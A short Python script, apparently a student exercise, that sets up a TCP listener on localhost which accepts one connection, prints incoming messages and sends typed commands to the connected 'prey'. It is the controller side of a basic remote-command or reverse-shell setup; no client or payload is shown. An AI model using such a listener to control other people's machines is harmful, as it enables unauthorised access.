#-*-coding: utf-8-*-
from socket import *
from threading import Thread
#este programa es para una clase que estoy haciendo en la escuela
class Master:
	def __init__(self, host, port):
		self.sock = socket(AF_INET, SOCK_STREAM)
		self.sock.bind((host, port))
		self.sock.listen(1)
	def hearPrey(self):
		self.conn, addr = self.sock.accept()
		print(addr)
		self.conn.settimeout(0.0)
		while True:
			try: 
				msj = self.conn.recv(3072)
				msj = msj.decode()
			except:
				pass
			else:
				print("{}\n".format(msj))
	def huntPrey(self):
		cmd = ""
		while cmd != "exit":
			cmd = input(">>>")
			self.conn.send(cmd.encode())
		exit()

def getMyIp():
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	return s.getsockname()[0]
def main():
	server = Master("127.0.0.1", 5000)
	ears = Thread(target=server.hearPrey)
	ears.deamon = True
	ears.start()
	server.huntPrey()

if __name__ == '__main__':
	main()